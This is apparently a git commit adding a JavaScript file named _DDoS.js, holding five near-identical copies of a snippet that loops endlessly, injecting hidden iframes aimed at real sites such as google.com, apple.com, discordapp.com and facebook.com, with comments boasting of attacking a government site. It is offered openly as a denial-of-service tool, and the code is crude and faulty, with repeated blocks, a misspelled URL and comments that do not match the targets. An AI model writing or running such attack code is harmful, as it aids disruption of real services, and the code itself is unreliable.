b5fd14acbc0de7367dcc8d1ef0c60f68d61167c0
mwear3robloxandroid <mitchellwears@gmail.com>
2017-08-15 07:45:34 -0400

    Create _DDos.js

---
+++ _DDos.js
@@ -0,0 +1,74 @@
+//Contributed by Sakura-chan
+//(c)Copyright 2016 - Anonymous Security Hackers
+
+function _DDoS(url){
+ document.body.innerHTML+='<iframe src="'+url+'" style="display:none;"></iframe>';
+}
+for(;;){
+ setTimeout('_DDoS("https://www.google.com")',2000);
+}
+
+/* This code will take a **
+** rock and roll with the**
+** site www.gov.ph       **
+** \m/ Enjoy this kids.  **
+*/
+//Contributed by Sakura-chan
+//(c)Copyright 2016 - Anonymous Security Hackers
+
+function _DDoS(url){
+ document.body.innerHTML+='<iframe src="'+url+'" style="display:none;"></iframe>';
+}
+for(;;){
+ setTimeout('_DDoS("https://www.apple.com")',2000);
+}
+
+/* This code will take a **
+** rock and roll with the**
+** site www.gov.ph       **
+** \m/ Enjoy this kids.  **
+*/
+//Contributed by Sakura-chan
+//(c)Copyright 2016 - Anonymous Security Hackers
+
+function _DDoS(url){
+ document.body.innerHTML+='<iframe src="'+url+'" style="display:none;"></iframe>';
+}
+for(;;){
+ setTimeout('_DDoS("https://www.android.com")',10);
+}
+
+/* This code will take a **
+** rock and roll with the**
+** site www.gov.ph       **
+** \m/ Enjoy this kids.  **
+*/
+//Contributed by Sakura-chan
+//(c)Copyright 2016 - Anonymous Security Hackers
+
+function _DDoS(url){
+ document.body.innerHTML+='<iframe src="'+url+'" style="display:none;"></iframe>';
+}
+for(;;){
+ setTimeout('_DDoS("https://www.discordapp.com")',10);
+}
+
+/* This code will take a **
+** rock and roll with the**
+** site www.gov.ph       **
+** \m/ Enjoy this kids.  **
+*///Contributed by Sakura-chan
+//(c)Copyright 2016 - Anonymous Security Hackers
+
+function _DDoS(url){
+ document.body.innerHTML+='<iframe src="'+url+'" style="display:none;"></iframe>';
+}
+for(;;){
+ setTimeout('_DDoS("https://wwa.facebook.com")',2000);
+}
+
+/* This code will take a **
+** rock and roll with the**
+** site www.gov.ph       **
+** \m/ Enjoy this kids.  **
+*/
